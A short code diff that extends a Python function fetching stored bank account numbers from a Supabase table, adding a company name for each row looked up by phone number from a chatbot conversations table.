@@ -933,12 +933,19 @@ def update_captured_cuenta_banco(phone: str, banco: str):
 
 
 def get_captured_cuentas():
-    """Retrieves all captured account numbers ordered by date."""
+    """Retrieves all captured account numbers ordered by date, enriched with empresa from bot_conversations."""
     if not supabase_client:
         return []
     try:
         res = supabase_client.table('captured_cuentas').select("*").order("created_at", desc=True).execute()
-        return res.data
+        cuentas = res.data or []
+        if cuentas:
+            phones = list({c["phone"] for c in cuentas})
+            ctx_res = supabase_client.table('bot_conversations').select("phone, empresa").in_("phone", phones).execute()
+            empresa_map = {row["phone"]: row.get("empresa", "") for row in (ctx_res.data or [])}
+            for c in cuentas:
+                c["empresa"] = empresa_map.get(c["phone"], "")
+        return cuentas
     except Exception as e:
         print(f"❌ Error fetching captured cuentas: {e}")
         return []
